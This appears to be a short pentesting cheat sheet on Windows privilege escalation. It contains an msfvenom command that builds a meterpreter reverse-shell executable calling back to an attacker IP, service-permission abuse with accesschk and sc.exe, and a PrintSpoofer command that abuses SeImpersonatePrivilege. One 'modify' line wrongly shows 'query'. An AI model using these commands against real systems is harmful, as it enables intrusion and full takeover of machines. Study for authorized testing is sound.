# Windows Privilege Escalation
Check out these repositories:

[WHP](https://github.com/51x/WHP) List of low hanging exploits to try

## Metasploit
If you are able to catch a meterpreter shell, always check post/multi/recon/local_exploit_suggester first.
```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1337 -f exe -o reverse.exe
```

Also use the meterpreter command `getsystem`

## Service Exploits
See what users are available
```cmd
> net user
```

[Here](https://docs.microsoft.com/en-us/windows/win32/services/service-user-accounts) are service users. 99.9% of the time you want LocalSystem.

See what write permissions you have for all services using [accesschk.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
```cmd
> accesschk.exe /accepteula -uwcqv <user> *
```

Query the configuration of a service
```cmd
> sc.exe qc <name>
```
Query the current status of a service
```cmd
> sc.exe query <name>
```
Modify a configuration option of a service. Here are a list of [options/values](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config)
```cmd
> sc.exe query <name> <option>= <value>
```
Start/stop services
```cmd
> net start/stop <name>
```

## Permission Misconfig
Display security configuration of the current user
```cmd
> whoami /all
```

There are a few security configurations that you are looking for. The security implications are [here](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)

SeImpersonatePrivilege is an easy one to exploit with a few exploits at your disposal.
```cmd
> .\PrintSpoof.exe -i -c "whoami"
```